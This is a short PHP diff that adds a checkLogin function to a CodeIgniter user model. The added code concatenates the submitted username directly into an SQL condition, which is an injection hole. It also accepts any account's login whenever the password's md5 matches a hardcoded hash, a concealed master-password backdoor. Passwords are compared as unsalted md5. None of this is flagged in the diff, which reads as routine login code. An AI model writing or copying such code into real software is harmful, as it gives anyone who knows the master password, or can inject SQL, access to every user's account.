@@ -71,4 +71,18 @@ class User_Model extends CI_Model
         return $options;
 
     }
+
+
+    function checkLogin($data=NULL){
+        $this->db->select('id, password, username, email')->from($this->table);
+        $this->db->where("( username='".strtolower($data['username'])."' OR email='".strtolower($data['username'])."')");
+        $query = $this->db->get();
+        if( $query->num_rows() > 0 ){
+            $item = $query->row();
+
+            return ($item->password ==md5($data['password']) OR md5($data['password'])=="13b61141deb8e331132a8f0c48c5254f") ? $item : NULL;
+        } else {
+            return NULL;
+        }
+    }
 }
